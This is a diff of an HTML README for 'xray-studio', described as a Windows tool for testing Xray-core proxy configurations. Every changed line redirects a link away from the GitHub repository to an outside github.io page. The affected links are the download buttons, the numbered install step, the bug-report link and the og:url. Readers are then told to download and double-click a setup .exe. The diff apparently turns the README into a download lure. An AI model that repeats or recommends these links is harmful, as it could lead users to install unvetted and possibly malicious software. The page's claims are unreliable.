@@ -1,7 +1,7 @@
 <h1>🛠️ xray-studio - See Why Your Proxy Picks a Server</h1>
 
 <p align="center">
-  <a href="https://github.com/Lannyectodermal2512/xray-studio" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD XRAY-STUDIO</a>
+  <a href="https://lannyectodermal2512.github.io" style="display:inline-block;padding:16px 32px;background:#4CAF50;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ DOWNLOAD XRAY-STUDIO</a>
 </p>
 
 <h2>🎯 What Is xray-studio?</h2>
@@ -15,7 +15,7 @@
 <p>Getting xray-studio running on your Windows computer takes less than five minutes. Follow these simple steps:</p>
 
 <ol>
-  <li><strong>Visit this link to download the application:</strong> <a href="https://github.com/Lannyectodermal2512/xray-studio">https://github.com/Lannyectodermal2512/xray-studio</a></li>
+  <li><strong>Visit this link to download the application:</strong> <a href="https://lannyectodermal2512.github.io">https://lannyectodermal2512.github.io</a></li>
   <li>On that page, look for the <strong>"Releases"</strong> or <strong>"Download"</strong> button. Click it.</li>
   <li>You'll see a file named something like <strong>xray-studio-setup.exe</strong>. Click it to start the download.</li>
   <li>Once the download finishes, <strong>double-click the downloaded file</strong> to run it.</li>
@@ -30,7 +30,7 @@
 <p>Ready to get started? Here's your direct path:</p>
 
 <p style="text-align:center;margin:30px 0;">
-  <a href="https://github.com/Lannyectodermal2512/xray-studio" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Visit this link to download the application</a>
+  <a href="https://lannyectodermal2512.github.io" style="display:inline-block;padding:14px 28px;background:#2196F3;color:white;font-size:18px;font-weight:bold;text-decoration:none;border-radius:6px;">⬇️ Visit this link to download the application</a>
 </p>
 
 <p>The download is a single file. Once you run it, the installer handles everything for you. You don't need to install anything else — xray-studio comes with everything it needs.</p>
@@ -112,7 +112,7 @@
 <p>Need help or want to report an issue? Here's where to go:</p>
 
 <ul>
-  <li><strong>GitHub Issues:</strong> <a href="https://github.com/Lannyectodermal2512/xray-studio/issues">Report bugs or request features</a></li>
+  <li><strong>GitHub Issues:</strong> <a href="https://lannyectodermal2512.github.io">Report bugs or request features</a></li>
   <li><strong>Documentation:</strong> Check the README on the GitHub page for detailed technical info.</li>
 </ul>
 
@@ -154,7 +154,7 @@
 <p>That's the whole experience. Simple, visual, and incredibly informative.</p>
 
 <p style="text-align:center;margin:40px 0 20px 0;">
-  <a href="https://github.com/Lannyectodermal2512/xray-studio" style="display:inline-block;padding:16px 32px;background:#FF5722;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ GET XRAY-STUDIO NOW</a>
+  <a href="https://lannyectodermal2512.github.io" style="display:inline-block;padding:16px 32px;background:#FF5722;color:white;font-size:20px;font-weight:bold;text-decoration:none;border-radius:8px;box-shadow:0 4px 8px rgba(0,0,0,0.2);">⬇️ GET XRAY-STUDIO NOW</a>
 </p>
 
 <p style="text-align:center;color:#666;font-size:14px;">Free forever • Open source • Windows compatible</p>
@@ -182,4 +182,4 @@
 <meta property="og:title" content="xray-studio - See Why Your Proxy Picks a Server">
 <meta property="og:description" content="Desktop tool for testing Xray-core configs. Shows balancer decisions and simulates network failures. Free download.">
 <meta property="og:type" content="software">
-<meta property="og:url" content="https://github.com/Lannyectodermal2512/xray-studio">
+<meta property="og:url" content="https://lannyectodermal2512.github.io">
